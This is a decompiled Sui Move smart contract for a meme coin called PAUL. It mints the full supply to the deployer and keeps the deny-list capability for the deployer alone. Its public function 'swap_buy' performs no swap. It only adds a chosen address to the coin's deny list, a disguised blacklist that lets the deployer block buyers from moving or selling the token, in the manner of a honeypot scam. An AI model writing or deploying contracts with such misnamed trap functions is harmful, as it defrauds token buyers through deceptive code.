module 0xae30e7484ea1cc8b602ad33f251ad8ede150ebcf6af2a71e9250bf30d500c904::paul {
    struct PAUL has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PAUL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PAUL>(arg0, 9, b"PAUL", b"ALIEN PAUL", b"I came from a different planet to takeover solana and bring memes meta back, tired of those ai coins bruh", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmaqpnc7B4fZzmGF3dbhDBUhdAN1uqdcuPT2eyFqAVsatf"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PAUL>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PAUL>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PAUL>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PAUL>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PAUL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PAUL>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

